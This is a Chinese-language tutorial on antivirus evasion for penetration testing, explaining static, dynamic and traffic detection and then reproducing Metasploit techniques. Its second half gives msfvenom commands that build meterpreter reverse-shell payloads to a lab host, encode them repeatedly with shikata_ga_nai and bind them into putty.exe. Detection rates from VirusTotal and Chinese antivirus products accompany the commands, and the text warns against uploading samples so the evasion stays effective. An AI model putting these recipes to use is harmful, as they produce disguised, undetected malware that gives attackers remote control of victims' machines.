# 内网渗透-免杀

## 杀软原理

可执行文件存在的两种状态及检测方式：

- 未执行时在硬盘上的状态（静态检测）
- 执行后加载进内存的状态（动态监测）

杀软的基本等级：

- 无害：无任何可疑行为，无任何特征命中病毒特征
- 可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等
- 有害：特征命中病毒特征

### 静态检测

静态检测是在不实际运行程序的情况下进行的分析，大部分的静态检测对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。

静态检测针对样本文件在硬盘上的状态进行检测：

- 样本Hash检测：此类检测会对文件整体以及各个节段进行Hash计算，而后对比是否存在于特征病毒库中，这是最早期的检测方法。对于Hash检测，在源码中修改一下变量名，或在编译完成之后，通过二进制查看器修改某一不重要的字节码，即可改变整个文件的Hash。
- 特征码检测：由于样本Hash检测的缺点，特征码会提取文件中部分关键字节码作为特征进行检测，字节码可以是硬编码的IP、域名、互斥体名称、加密秘钥或部分关键流程代码。杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。
- 黑白名单检测：对于一些系统进程或是杀软进程可能会默认加白，这样即便有些恶意行为，也不会被查杀。

通常静态检测会识别代码中存在的函数：

- Windows API函数：尤其是与内存、堆、线程相关的函数，例如virualalloc、rtlmovememory、ntcreatthread等。
- 编程语言关键词：cmd等关键词，例如Python中的subprocess.popen("cmd /c")

常见的绕过思路：

- 绕过静态检测的方式通常有多次加密、内存加载执行、加壳改壳、添加/替换资源、加密Shellcode等

常用的静态检测平台：

- https://www.virustotal.com/，注意：Virustotal是国外平台，请谨慎操作，最好不要直接上传文件，建议仅校验并检查MD5是否为恶意文件。

### 动态检测

动态检测针对样本文件内存中的状态进行检测：

- 内存特征码检测：对于静态文件特征码来说，可以将shellcode做多次加密，完全抹掉其原本特征，降低杀软的报毒率。但是当进入内存需要执行代码时，shellcode需要完全解密，这时候杀软只需要遍历内存，根据特征码进行查杀即可。
- 敏感API检测（HOOK）：在关键的入口或道路进行监控，如果单次或多次触发警告，比如读取并修改了其他进程的内存，或在其他进程中开了个远程线程将触发告警。对于不同杀软的不同策略，将根据调用顺序、调用源、参数判断是否是正常调用。
- 敏感行为检测：实现一个功能，不一定非要用某一个固定的接口，因此，实现一个读写内存操作，单检测一个API是无效的。此时，只要对象触发了某种行为，在其他进程中开了线程，那么就判定为恶意行为。常见的病毒恶意行为：
  - 注册表操作：添加启动项、添加服务。
  - 文件操作：写入文件、读取系统文件、删除文件、移动文件。
  - 进程操作：杀死进程、创建进程。
  - 用户操作：添加用户、删除用户、删除用户。
  - 其他操作：注入、劫持等。

常见的绕过思路：

- 绕过动态检测的方式通常是白名单调用敏感行为，再导入恶意内容

常用的动态检测平台：

- https://s.threatbook.cn/

### 流量检测

流量检测针对恶意程序在网络通讯流量层面上的状态进行检测：

- 结构特征：此类特征一般是指已知远控的恶意程序心跳包，比如CS beacon心跳包特征，会按照攻击者设置的频率发送固定结构固定内容的数据包以证明存活。
- 内容特征：此类特征一般是指各类漏洞的exp流量包特征、冰蝎、哥斯拉等流量特征，对于此类流量可以编写流量规则进行过滤检测，比如suricata规则、wireshark规则等。
- IP/域名/证书匹配：对于数据包中的ip域名等信息，链接威胁情报平台查询是否存在恶意行为，比如扫描、用作C2回连或网站挂马等，对于此类流量可以选择弹窗告警或直接阻断。

常见的绕过思路：

- 绕过流量检测的方式通常有TCP分段传输、内容加密、使用合法证书等

### 云查杀

云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，只要联网，病毒库就会同步更新，病毒库更加强大。

当开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了。

## 免杀原理

### 静态免杀

#### 修改特征码

特征码是能够识别一个程序的不大于64字节的字符。

修改特征码是在不改变程序运行效果的前提下，更改其特征码。

修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。

#### 花指令免杀

花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。

为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，也就无法正常检测木马了。

#### 加壳免杀

软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。

加壳能够掩盖特征码，特别是对于不开源的PE文件，加壳可以绕过很多特征码识别。但是壳也有自己的特征，主流的壳例如VMP、Themida等，被检测出将直接报毒。

可以用一些冷门的加密壳，或基于开源压缩壳做二次开发。

加壳工具：

- ASPack
- UPX

### 动态免杀

#### API免杀

- 替换API：杀软不可能拦截所有API，可以使用相同功能的API进行替换，例如`MoveFileEx`替换`MoveFile`。

- 重写API：逆向后完全重写系统API功能，实现对应功能的API。

- 底层API：寻找更底层的API进行调用，绕过拦截，例如NT函数。或者通过DeviceloControl函数调用驱动功能来完成API功能，模拟系统调用。

#### 内存免杀

在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。加壳时，需要加一个混淆程序原有代码的壳，才能躲过杀软查杀。

#### 二次编译

Metasploit的Msfvenom提供了多种格式的Payload和Encoder，生成的Shellcode也为二次加工提供了很大便利。

Shikata_ga_nai是MSF中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样的，还可以利用管道进行多重编码进行免杀。

目前Msfvenom的Encoder特征基本都进入了杀软的漏洞库，很难实现单一Encoder编码而绕过杀软，所以对Shellcode进行进一步修改编译成了MSF免杀的主流。有很多借助于C、C#、python等语言对Shellcode进行二次编码从而达到免杀的效果。

#### 分离免杀

例如Payload分离免杀和Webshell分离免杀，将Shellcode和加载器分离，实现简单，但效果不错。

#### 资源修改

有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。

- 添加资源：使用ResHacker将正常软件的资源加入到恶意软件，例如图片、版本信息、对话框等
- 替换资源：使用ResHacker替换无用的资源，例如版本等
- 添加签名：使用签名伪造工具，将正常软件的签名信息添加到恶意软件

# 免杀技术复现

## 免杀能力一览表

![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002067.png)

![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002269.png)

## 复现环境

攻击机：

- 192.168.174.128

免杀方法：

- 此处仅介绍msf、Evasion、Veil、Venom、C/C++ Shellcode，其余方法参见：https://github.com/TideSec/BypassAntiVirus

原po各杀软版本：

- 360杀毒版本5.0.0.8160(2019.12.12)
- 火绒版本5.0.33.13(2019.12.12)
- 360安全卫士12.0.0.2001(2019.12.17)

本文各杀软版本：

- 火绒版本5.0.68.2(2022.05.26)
- 360安全卫士13.0.0.2003(2022.05.26)

测试平台：

- Virustotal，以下简称VT。注意，如果是自己做免杀，建议测试机不要连互联网，更不要上传到virustotal.com类似的平台上。
- 不要上传！
- 不要上传！
- 不要上传！
- 上传一次以后，你自己辛辛苦苦写的免杀就不再免杀了。

## Metasploit自带免杀

Payload均使用MSF的windows/meterperter/reverse_tcp模块生成。

攻击机MSF监听6666端口：

```
msf6 > use exploits/multi/handler
msf6 exploit(multi/handler) > set LHOST 192.168.174.128
msf6 exploit(multi/handler) > set LPORT 6666
msf6 exploit(multi/handler) > run
```

### 原生态payload(VT查杀率51/69)

MSF生成原始payload：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -f exe -o /mnt/hgfs/Share/payload1.exe
```

![image-20220526190423066](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002023.png)

本地的360全家桶和火绒都能查杀。

在virustotal.com上查杀率为51/69（原po为53/69）。

360：

![image-20220526190107987](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002057.png)

火绒：

![image-20220526190513816](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002970.png)

VT查杀成功：

![image-20220526190921570](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002055.png)

VT查杀失败：

![image-20220526190959477](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002552.png)

### msf自编码免杀(VT查杀率48/67)

使用`msfvenom --list encoders`可查看所有编码器。

评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器。

使用`x86/shikata_ga_nai`生成payload，参数`-i`为编码次数，使用`-b`参数去掉payload中的空字符：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -b "\x00" -i 15  -f exe -o /mnt/hgfs/Share/payload2.exe
```

![image-20220526191328018](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002680.png)

由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。

本地的360全家桶和火绒都能查杀。

在virustotal.com上查杀率为48/67（原po为51/69）。

360：

![image-20220526191412121](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002808.png)

火绒：

![image-20220526191549429](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002659.png)

VT查杀成功：

![image-20220526191847382](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002840.png)

VT查杀失败：

![image-20220526191857605](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002027.png)

### msf自捆绑免杀(VT查杀率15/69)

在生成payload时可以使用捆绑功能，使用msfvenom的`-x`参数可以指定一个自定义的可执行文件作为模板,并将payload嵌入其中，`-x`后面跟对应文件路径就可以。

这里使用一个正规的`putty.exe`作为被捆绑测试软件。

生成payload命令如下：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666  -x putty.exe  -f exe -o /mnt/hgfs/Share/payload3.exe
```

![image-20220526192124189](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002284.png)

生成的两个文件对比，大小完全一样。能否免杀也和被捆绑exe有一定关系，可以选微软的一些工具作为模板exe程序。

![image-20220526192251559](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002231.png)

本地的360全家桶能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒也能查杀）。

在virustotal.com上查杀率为15/69（原po为39/69）。

360：

![image-20220526192548112](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002501.png)

VT：

![image-20220526193243216](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002510.png)



### msf自捆绑+编码(VT查杀率16/69)

将上面的编码和捆绑两种方法结合一下进行尝试：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o /mnt/hgfs/Share/payload4.exe
```

![image-20220526193359812](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002960.png)

与上一种方法对比，大小完全一样。

![image-20220526193552798](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002934.png)

可修改-i编码次数，编码次数越多，生成的payload越可能免杀，经测试，编码5次和6次可免杀360。

本地的360全家桶能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒动态静态均能查杀，而360不会报毒）。

在virustotal.com上查杀率为16/69（原po为35/69）。

360：

![image-20220526194032466](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002236.png)

VT：

![image-20220526193813109](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002141.png)

### msfvenom多重编码(VT查杀率28/67)

msfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。

如下命令，使用管道让`msfvenom`对攻击载荷多重编码，先用`shikata_ga_nai`编码20次，接着来10次的`alpha_upper`编码，再来10次的`countdown`编码，最后才生成以`putty.exe`为模板的可执行文件。

```
msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.174.128 LPORT=6666 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o /mnt/hgfs/Share/payload5.exe
```

如果报错`Error: You must select an arch for a custom payload`，则添加参数：

```
-a x86 --platform windows
```

![image-20220526194938055](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002350.png)

还有更多重编码姿势：

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b "&" -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe > payload6.exe
```

经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。

本地360全家桶可以查杀，火绒不能查杀。

在virustotal.com上查杀率为28/67（原po为45/70），并且Bypass了McAfee。

360：

![image-20220526195103114](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002455.png)

VT：

![image-20220526195652390](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205262002721.png)



## 
